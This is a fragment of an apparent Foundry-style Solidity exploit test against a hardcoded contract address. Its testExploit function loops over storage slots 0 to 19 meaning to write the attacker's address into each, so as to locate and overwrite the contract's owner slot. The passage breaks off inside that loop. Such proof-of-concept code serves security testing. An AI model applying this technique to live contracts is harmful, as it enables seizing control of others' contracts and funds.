    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x100F770A25Af4c2ec5f3DAdF47A329b2abaA8eEf;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Try different storage slots to find where owner is stored
        for (uint256 slot = 0; slot < 20; slot++) {
            // Write attacker address to this slot
            bytes32 slotBytes = bytes32(slot);
            bytes32 attackerBytes = bytes32(uint256(uint160(attacker)));
